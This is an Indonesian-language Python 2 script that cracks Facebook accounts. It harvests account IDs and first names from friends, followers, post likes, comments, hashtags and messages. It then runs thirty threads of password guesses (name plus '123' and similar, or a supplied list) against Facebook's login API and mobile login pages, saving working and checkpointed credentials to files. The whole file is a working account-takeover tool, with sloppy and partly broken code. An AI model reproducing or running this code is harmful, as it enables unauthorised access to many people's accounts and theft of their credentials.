#!/usr/bin/python2
# coding=utf-8
# Coding By : Master Sadboy Cyber
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
b='\033[1;94m'

i='\033[1;92m'

c='\033[1;96m'

m='\033[1;91m'

u='\033[1;95m'

k='\033[1;93m'

p='\033[1;97m'

h='\033[1;90m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH 

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11;]')
ua = Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11
uas = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
ip = requests.get('https://api.ipify.org').text
kt = requests.get('https://squirming-claim.000webhostapp.com/region/?').text
uas = random.choice(["Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11"])
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

logo = """                                                                        
                                                            
                                                            
                                                                            
                                                                                
                                                                        
                                                            
                                                                        
                                                                            
                                                        
                                                    
                                                            
                                                                                
                                                                    
                                                                    
                                                                            
                                                                
                                                    
                                                            
                                                                
                                                                                
                                                                
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                           
"""
 
def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')#00119E
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print"[+] Masukan Token :D"
        token = raw_input('\n[+] Masukan Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token='+token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print(('\x1b[92m[•] Login Sukses!\x1b[0m'))
            raw_input('[>] Tekan Enter ')
            menu()
        except KeyError:
            print ' [!] Token Invalid'
            sys.exit()
            
            
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()
    print logo
    print"[+] Bergabung    : \033[0;97m" +durasi+" (\033[0;92m29 day ago\033[0;97m)"
    print"[+] ----------------------------------------"
    print"\033[0;97m[+] Premium      : \033[0;92m Ya"
    print"\033[0;97m[+] Kadaluwarsa  : 20-08-2021"
    print"\033[0;97m[+] ----------------------------------------"
    print"\033[0;97m[+] IP           : \033[0;97m" +ip
    print"\n"
    print"[ Welcome : \033[0;93m"+nama+"\033[0;97m ]\n"
    print"[01]. Metode B-api (Fast-Crack)"
    print"[02]. Metode Mbasic (Slow-Crack)"
    print"[03]. Metode Touch-Fb (Super-Slow)"
    print"[00]. Logout (hapus token)"
    method = raw_input('\n[?] Pilih Menu : ')
    if method == '':
        menu()
    elif method == '01' or method == '1':
        menubapi()
    elif method == '02' or method == '2':
        menumbasic()
    elif method == '00' or method == '0':
        os.system('rm -f login.txt')
        print'[!] Berhasil Menghapus Token'
        exit()
    else:
        exit('[!] Pilih Yang Bener')
        
        
def menubapi():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()
    print logo
    print""+p+"[+] Bergabung    : "+p+"" +durasi+" (\033[0;92m29 day ago\033[0;97m)"
    print""+p+"[+] ----------------------------------------"
    print(""+p+"[+] Premium      : "+H+"Ya")
    print""+p+"[+] Region       : "+p+"" +kt
    print""+p+"[+] ----------------------------------------"
    print""+p+"[+] IP           : "+p+"" +ip
    print""+p+""
    print"[ selamat datang \033[0;93m"+nama+"\033[0;97m ]"
    print""+p+""
    print""+p+"[01]. crack dari pencarian nama"
    print"[02]. crack dari id publik"
    print"[03]. crack dari postingan"
    print"[04]. crack dari followers"
    print"[05]. crack dari postingan grup"
    print"[06]. crack dari total komentar"
    print"[07]. crack dari pesan chat"
    print"[08]. crack dari hastag"
    print"[09]. lihat hasil crack"
    print("["+m+"00"+p+"]. logout (token)")
    print
    pilih_menubapi()


def pilih_menubapi():
    ask = raw_input('[?] pilih menu : ')
    if ask == '':
        print '[!] Pilih Yang Bener !'
        exit()
        
    elif ask == '01' or ask == '1':
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '02' or ask == '2':
    	print ("[!] isi 'me' jika ingin crack dari daftar teman anda")
        idt = raw_input('[+] masukkan id atau username : ')
        print

        try:

            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?limit=5000&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print '[+] total id -> ' + str(len(id))
            
    elif ask == '04' or ask == '4':
        idt = raw_input('[+] Masukan Id Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '03' or ask == '3':
        idt = raw_input('[+] Masukan Id Postingan : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '06' or ask == '6':
        idt = raw_input('[+] Masukan Id Postingan : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/comments?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '01' or ask == '1':
        idt = raw_input('[+] Nama : ')
        r = requests.get('https://graph.facebook.com/search/people/?q='+idt+'&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '08' or ask == '8':
        idt = raw_input('[+] Masukan hashtag : ')
        r = requests.get('https://graph.facebook.com/hashtag/' +idt+ '?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '07' or ask == '7':
        r = requests.get('https://graph.facebook.com/messages?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '05' or ask == '5':
        idt = raw_input('[+] Masukan Id Postingan : ')
        r = requests.get('https://graph.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier=' +idt+ 'limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '05' or ask == '5':
        print '\n[1] Hasil OK '
        print '[2] Hasil CP '
        ress = raw_input('\n[?] Choose : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print"\033[0;97m========================================"
            print '\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            print"\033[0;97m========================================"
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '02' or ress == '2':
            print"\033[0;97m========================================"
            print '[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            print"\033[0;97m========================================"
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[!] Pilih Yang Bener !')
    elif ask == '00' or ask == '0':
        os.system('rm -f login.txt')
        print '[!] Berhasil Menghapus Token'
        exit()
    else:
        print '[!] Pilih Yang Bener !'
        exit()
    ask = raw_input('[?] apakah anda ingin menggunakan password manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    
    print
    print '[+] hasil ok disimpan ke -> ok.txt'
    print '[+] hasil cp disimpan ke -> cp.txt'
    print
    print"[!] anda bisa menjeda crack dengan mematikan data seluler"
    print

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[crack] %s/%s OK-:%s - CP-:%s  '% (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower()]:
                ua_api = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_api)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m[CP] ' + uid + '|' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                   try:
                      r=requests.get('https://graph.facebook.com/'+uid+'?access_token='+token)
                      az = json.loads(r.text)
                      ttl= az['birthday']
                   except (KeyError, IOError):
                    ttl = ' '
                   except: pass
                   print '\r\x1b[0;93m[CP] ' + uid + '|' + pw + '|' + ttl + '        '
                   cp.append(uid + ' | ' + pw)
                   save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                   save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
                   save.close()
                   break
                   continue
                   continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Finished'
    exit()


def manualbapi():
    print'\n[*] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input('[?] Set Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Bener, Tidak Boleh Kosong')
    print '[*] Total ID : ' + str(len(id))
    print '[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print '[!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m[CP] ' + uid + '|' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r\x1b[0;93m[CP]' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n[√] Crack Selesai'
    exit()
    
def menumbasic():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()
    print logo
    print""+p+"[+] Bergabung    : "+p+"" +durasi
    print""+p+"[+] ----------------------------------------"
    print(""+p+"[+] Premium      : "+H+"Ya")
    print""+p+"[+] Region       : "+p+"" +kt
    print""+p+"[+] ----------------------------------------"
    print""+p+"[+] IP           : "+p+"" +ip
    print""+p+""
    print"[ selamat datang \033[0;93m"+nama+"\033[0;97m ]"
    print""+p+""
    print""+p+"[01]. crack dari pencarian nama"
    print"[02]. crack dari id publik"
    print"[03]. crack dari postingan"
    print"[04]. crack dari followers"
    print"[05]. crack dari postingan grup"
    print"[06]. crack dari total komentar"
    print"[07]. crack dari pesan chat"
    print"[08]. crack dari hastag"
    print"[09]. lihat hasil crack"
    print("["+m+"00"+p+"]. logout (token)")
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n[?] pilih menu : ')
    if ask == '':
        print'[!] Pilih Yang Bener !'
        exit()
    elif ask == '01' or ask == '1':
        print "\n[*] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '02' or ask == '2':
    	print ("[!] isi 'me' jika ingin crack dari daftar teman anda")
        idt = raw_input('[+] masukkan id atau username : ')
        print

        try:

            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?limit=5000&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print '[+] total id -> ' + str(len(id))

    elif ask == '03' or ask == '3':
        print "\n[*] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '03' or ask == '3':
        print '\n[*] Mikan ID Postingan'
        idt = raw_input('[+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '04' or ask == '4':
        print'\n [1] Hasil OK '
        print'[2] Hasil CP '
        ress = raw_input('\n [?] Choose : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print '\n [#] ------------------------------------------------'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '02' or ress == '2':
            print '\n [#] ------------------------------------------------'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [!] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [!] Berhasil Menghapus Token'
        exit()
    else:
        print ' [!] Pilih Yang Bener !'
        exit()
    ask = raw_input('[?] apakah anda ingin menggunakan password manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()
    
    print
    print '[+] hasil ok disimpan ke -> ok.txt'
    print '[+] hasil cp disimpan ke -> cp.txt'
    print
    print"[!] anda bisa menjeda crack dengan mematikan data seluler"
    print

    def main(arg):
        global loop
        print '\r\x1b[0;97m[crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower()]:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m[CP] ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93m * --> ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' * --> ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Finished'
    exit()


def manualmbasic():
    print'\n[*] Masukan Password Contoh : sayang,rahasia'
    pw = raw_input('[?] Set Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Bener, Tidak Boleh Kosong')
    print'[*] Total ID : ' + str(len(id))
    print'[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print'[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print'\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m[CP] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;93m[CP] ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Finished'
    exit()
    
if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()


